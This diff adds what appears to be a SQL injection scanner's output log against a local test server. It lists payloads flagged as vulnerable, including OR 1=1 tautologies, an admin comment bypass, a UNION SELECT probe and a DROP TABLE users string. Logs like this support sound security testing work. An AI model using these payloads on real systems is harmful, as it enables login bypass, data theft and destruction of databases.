@@ -1,0 +1,8 @@
+[VULNERABLE] http://127.0.0.1:8000/?id='
+[VULNERABLE] http://127.0.0.1:8000/?id=''
+[VULNERABLE] http://127.0.0.1:8000/?id=" OR "1"="1
+[VULNERABLE] http://127.0.0.1:8000/?id=' OR '1'='1
+[VULNERABLE] http://127.0.0.1:8000/?id=admin' --
+[VULNERABLE] http://127.0.0.1:8000/?id=' OR 1=1 --
+[VULNERABLE] http://127.0.0.1:8000/?id=' UNION SELECT NULL --
+[VULNERABLE] http://127.0.0.1:8000/?id=' DROP TABLE users --
